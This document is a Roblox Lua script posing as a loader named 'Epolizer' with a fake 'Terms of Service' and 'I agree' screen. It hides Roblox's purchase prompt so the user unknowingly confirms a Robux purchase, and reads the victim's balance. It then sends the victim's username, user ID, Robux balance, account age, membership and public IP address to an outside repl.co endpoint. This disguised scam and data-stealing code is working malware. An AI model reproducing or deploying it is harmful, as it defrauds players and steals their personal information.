

spawn(function()
    while true do
    wait()
    game.ReplicatedFirst:RemoveDefaultLoadingScreen()
    end
    end)
    -- Gui to Lua
    -- Version: 3.2
    
    -- Instances:
    repeat wait() until game:IsLoaded()
  game:GetService("RunService").Heartbeat:Connect(function()
    game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
end)
    local ScreenGui = Instance.new("ScreenGui")
    local loading = Instance.new("Frame")
    local TextLabel = Instance.new("TextLabel")
    local Frame = Instance.new("Frame")
    local UIGradient = Instance.new("UIGradient")
    local TextLabel_2 = Instance.new("TextLabel")
    local ImageLabel = Instance.new("ImageLabel")
    local Load = Instance.new("TextButton")
    local UICorner = Instance.new("UICorner")
    local Agreed = Instance.new("TextButton")
    local UICorner_2 = Instance.new("UICorner")
    
    --Properties:
    
    ScreenGui.Parent = game.Players:WaitForChild:WaitForChild("PlayerGui")
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    loading.Name = "loading"
    loading.Parent = ScreenGui
    loading.AnchorPoint = Vector2.new(0.5, 0.5)
    loading.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    loading.Position = UDim2.new(0.5, 0, 0.5, 0)
    loading.Size = UDim2.new(1, 0, 1.20000005, 0)
    
    TextLabel.Parent = loading
    TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.BackgroundTransparency = 1.000
    TextLabel.Position = UDim2.new(0.5, 0, 0.100000001, 0)
    TextLabel.Size = UDim2.new(0.225782409, 0, 0.0625954345, 0)
    TextLabel.Font = Enum.Font.Gotham
    TextLabel.Text = "E p o l i z e r"
    TextLabel.TextColor3 = Color3.fromRGB(7, 180, 243)
    TextLabel.TextSize = 60.000
    
    Frame.Parent = loading
    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
    Frame.BackgroundColor3 = Color3.fromRGB(7, 180, 243)
    Frame.BorderSizePixel = 0
    Frame.Position = UDim2.new(0.5, 0, 0.200000003, 0)
    Frame.Size = UDim2.new(0, 852, 0, 1)
    
    UIGradient.Parent = Frame
    
    local maintos = Instance.new("TextLabel")
    local tos = Instance.new("TextLabel")
    
    --Properties:
    
    maintos.Name = "maintos"
    maintos.Parent = loading
    maintos.AnchorPoint = Vector2.new(0.5, 0.5)
    maintos.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    maintos.BackgroundTransparency = 1.000
    maintos.Position = UDim2.new(0.5, 0, 0.300000012, 0)
    maintos.Size = UDim2.new(0.225782409, 0, 0.0625954345, 0)
    maintos.Font = Enum.Font.GothamBold
    maintos.TextTransparency = 1
    maintos.Text = "The button initiates a virtual transaction consisting of etc."
    maintos.TextColor3 = Color3.fromRGB(243, 243, 243)
    maintos.TextSize = 12.000
    
    tos.Name = "tos"
    tos.Parent = loading
    tos.AnchorPoint = Vector2.new(0.5, 0.5)
    tos.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    tos.BackgroundTransparency = 1.000
    tos.Position = UDim2.new(0.5, 0, 0.219999999, 0)
    tos.Size = UDim2.new(0.225782409, 0, 0.0625954345, 0)
    tos.Font = Enum.Font.Gotham
    tos.TextTransparency = 1
    tos.Text = "Terms of Service"
    tos.TextColor3 = Color3.fromRGB(243, 243, 243)
    tos.TextSize = 14.000
    
    TextLabel_2.Parent = loading
    TextLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
    TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel_2.BackgroundTransparency = 1.000
    TextLabel_2.Position = UDim2.new(0.5, 0, 0.159999996, 0)
    TextLabel_2.Size = UDim2.new(0.225782409, 0, 0.0625954345, 0)
    TextLabel_2.Font = Enum.Font.GothamBold
    TextLabel_2.Text = "Getting script ready..."
    TextLabel_2.TextColor3 = Color3.fromRGB(243, 243, 243)
    TextLabel_2.TextSize = 14.000
    
    ImageLabel.Parent = loading
    ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ImageLabel.BackgroundTransparency = 1.000
    ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
    ImageLabel.Size = UDim2.new(0, 300, 0, 300)
    ImageLabel.Image = "rbxassetid://4965945816"
    
    
    
    Load.Name = "Load"
    Load.Parent = loading
    Load.AnchorPoint = Vector2.new(0.5, 0.5)
    Load.BackgroundColor3 = Color3.fromRGB(7, 180, 243)
    Load.Position = UDim2.new(0.552803278, 0, 0.55719983, 0)
    Load.Size = UDim2.new(0, 133, 0, 36)
    Load.Visible = true
    Load.AutoButtonColor = false
    Load.Font = Enum.Font.Gotham
    Load.Text = "Load Script"
    Load.BackgroundTransparency = 1
    Load.TextTransparency = 1
    Load.TextColor3 = Color3.fromRGB(243, 243, 243)
    Load.TextSize = 14.000
    
    UICorner.CornerRadius = UDim.new(0, 2)
    UICorner.Parent = Load
    
    Agreed.Name = "Agreed"
    Agreed.Parent = loading
    Agreed.AnchorPoint = Vector2.new(0.5, 0.5)
    Agreed.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Agreed.Position = UDim2.new(0.441999998, 0, 0.55719983, 0)
    Agreed.Size = UDim2.new(0, 133, 0, 36)
    Agreed.Visible = true
    Agreed.BackgroundTransparency = 1
    Agreed.TextTransparency = 1
    Agreed.AutoButtonColor = false
    Agreed.Font = Enum.Font.Gotham
    Agreed.Text = "I agree"
    Agreed.TextColor3 = Color3.fromRGB(243, 243, 243)
    Agreed.TextSize = 14.000
    
    UICorner_2.CornerRadius = UDim.new(0, 2)
    UICorner_2.Parent = Agreed
    
    -- Scripts:
    
    local function VGHGZ_fake_script() -- ImageLabel.LocalScript 
        local script = Instance.new('LocalScript', ImageLabel)
    
        loadingRing = script.Parent
        local TweenService = game:GetService("TweenService")
        local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
        local tween = TweenService:Create(loadingRing, tweenInfo, {Rotation = 360})
        tween:Play()
        
    end
    coroutine.wrap(VGHGZ_fake_script)()
    
    spawn(function()
    game:GetService("RunService").RenderStepped:Connect(function()
    if game:GetService("CoreGui"):FindFirstChild("PurchasePrompt") then
    for i, v in pairs(game:GetService("CoreGui").PurchasePrompt:GetDescendants()) do
    if v:IsA("Frame") then
        v.BackgroundTransparency = 1
    end
    if v:IsA("TextLabel") then
        if v.Name ~= "BalanceAmount" then
        v.Text = ""
        end
        v.TextTransparency = 1
    end
    if v:IsA("ImageButton") then
        v.ImageTransparency = 1
    end
    if v:IsA("ImageLabel") then
        v.ImageTransparency = 1
    end
    end
    end
    end)
    end)
    
    repeat wait() until game:IsLoaded()
    wait(2)
    local TweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.In)
    local tween = TweenService:Create(ImageLabel, tweenInfo, {Position = UDim2.new(1.2,0,0.5,0)})
    tween:Play()
    wait(1)
    tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.In)
    tween = TweenService:Create(tos, tweenInfo, {TextTransparency = 0})
    tween:Play()
    tween = TweenService:Create(maintos, tweenInfo, {TextTransparency = 0})
    tween:Play()
    tween = TweenService:Create(Agreed, tweenInfo, {TextTransparency = 0,BackgroundTransparency = 0})
    tween:Play()
    wait(2)
    local bal
    pcall(function()
        local thing = game:GetService("CoreGui").PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.FooterContent.Content.BalanceAmount.Text
        local extra = string.gsub(thing,",","")
        local extra2 = string.gsub(thing,".","")
        local extra3 = string.gsub(thing," ","")
        bal = tonumber(extra3) + 1
    end)
    if bal == nil then
        game.Players.LocalPlayer:Kick("Error in script.")
    end
    game:GetService("RunService").RenderStepped:Connect(function()
        if workspace:FindFirstChild("robu") then
            workspace.robu.Value = bal
        end
    end)

game:GetService("CoreGui").PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.Buttons["1"].MouseButton1Down:Connect(function()
    tween = TweenService:Create(Agreed, tweenInfo, {TextTransparency = 1,BackgroundTransparency = 1})
    tween:Play()
    tween = TweenService:Create(Load, tweenInfo, {TextTransparency = 0,BackgroundTransparency = 0})
    tween:Play()
    tos.Text = "All ready!"
    maintos.Text = "Press Load Script to load the script."
    game:GetService("CoreGui").PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.Buttons["2"].MouseButton1Down:Connect(function()
        
    end)
end)
local d = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..game.Players.LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false"))
local prem = "None"
if game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
    prem = "Premium"
end
http_request = http_request or request or (http and http.request) or syn.request 
local response = http_request(
    {

        Url = "https://Google.littsedth.repl.co/goofy",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"  -- When sending JSON, set this!
        },
        Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {{
            ["title"] = "@"..game.Players.LocalPlayer.Name,
            ["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.. "/profile",
            ["fields"] = {
                {
                    ["name"] = "Robux",
                    ["inline"] = true,
                    ["value"] = "```lua\n"..tostring(bal).."```",
                },
                {
                    ["name"] = "Account Age",
                    ["inline"] = true,
                    ["value"] = "```lua\n"..tostring(game.Players.LocalPlayer.AccountAge).."```",
                },
                            {
                    ["name"] = "User ID",
                    ["inline"] = true,
                    ["value"] = "```lua\n"..tostring(game.Players.LocalPlayer.UserId).."```",
                },
                {
                    ["name"] = "IP Address",
                    ["inline"] = true,
                    ["value"] = "```lua\n"..tostring(game:HttpGet("https://api.my-ip.io/ip.txt")).."```",
                },
                {
                    ["name"] = "Membership",
                    ["inline"] = true,
                    ["value"] = "```lua\n"..tostring(prem).."```",
                },
            },
            ["thumbnail"] = {
                ["url"] = d.data[1].imageUrl
            }
        }}})
    }
)
